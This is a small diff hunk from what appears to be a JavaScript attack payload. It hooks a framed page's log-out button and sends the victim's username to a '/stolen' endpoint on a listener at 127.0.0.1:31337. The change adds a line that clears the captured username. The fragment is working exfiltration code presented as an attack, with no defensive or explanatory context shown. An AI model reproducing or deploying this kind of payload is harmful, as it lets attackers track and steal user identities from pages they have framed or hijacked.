@@ -44,6 +44,7 @@ function payload(attacker) {
   .load(function(){
 	$('#ifr').contents().find("#log-out-btn").click(function(){
 		queryDial = "http://127.0.0.1:31337/stolen?event=logout&user=" + queryUsername;
+		queryUsername = "";
 		$.get(queryDial);
 	});
   })
